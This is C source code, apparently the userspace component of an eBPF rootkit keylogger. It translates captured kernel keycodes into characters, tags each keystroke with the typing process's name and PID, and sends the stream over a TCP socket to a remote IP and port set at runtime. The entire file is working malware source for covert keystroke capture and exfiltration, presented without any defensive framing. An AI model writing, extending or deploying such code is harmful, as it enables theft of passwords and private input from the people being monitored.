#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <bpf/libbpf.h>
#include "userspace/keylogger_processor.h"
#include "rootkit.skel.h"

static const char *keymap[256] = {
    [1] = "[ESC]", [2] = "1", [3] = "2", [4] = "3", [5] = "4", [6] = "5",
    [7] = "6", [8] = "7", [9] = "8", [10] = "9", [11] = "0", [14] = "[BACKSPACE]",
    [15] = "[TAB]", [16] = "q", [17] = "w", [18] = "e", [19] = "r", [20] = "t",
    [21] = "y", [22] = "u", [23] = "i", [24] = "o", [25] = "p", [28] = "\n",
    [30] = "a", [31] = "s", [32] = "d", [33] = "f", [34] = "g", [35] = "h",
    [36] = "j", [37] = "k", [38] = "l", [44] = "z", [45] = "x", [46] = "c",
    [47] = "v", [48] = "b", [49] = "n", [50] = "m", [57] = " "
};

int process_key_event(void *ctx, void *data, size_t data_sz)
{
    (void)data_sz;
    struct keylogger_ctx *keylogger_ctx = ctx;
    ssize_t ret;

    struct key_event_t {
        uint32_t pid;
        uint32_t code;
        uint32_t value;
        char comm[16];
    } *event = data;

    char msgbuf[128];
    const char *key_str = keymap[event->code];

    if (key_str)
        snprintf(msgbuf, sizeof(msgbuf), "[%s][%d] Key: %s\n", event->comm, event->pid, key_str);
    else
        snprintf(msgbuf, sizeof(msgbuf), "[%s][%d] Raw Keycode: %d\n", event->comm, event->pid, event->code);

    /* Print to local stdout */
    printf("%s", msgbuf);
    fflush(stdout);

    if (keylogger_ctx->keylogger_socket_fd >= 0) {
    ret = send(keylogger_ctx->keylogger_socket_fd, msgbuf, strlen(msgbuf), MSG_NOSIGNAL);

    if (ret < 0) {
        close(keylogger_ctx->keylogger_socket_fd);
        keylogger_ctx->keylogger_socket_fd = -1;
    }
}

    return 0;
}

int init_keylogger_sender_socket(const char *ip, int port)
{
    int ret = 0;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return sock;

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(port),
    };
    inet_pton(AF_INET, ip, &addr.sin_addr);

    ret = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (ret < 0) {
        close(sock);
        return ret;
    }
    return sock;
}
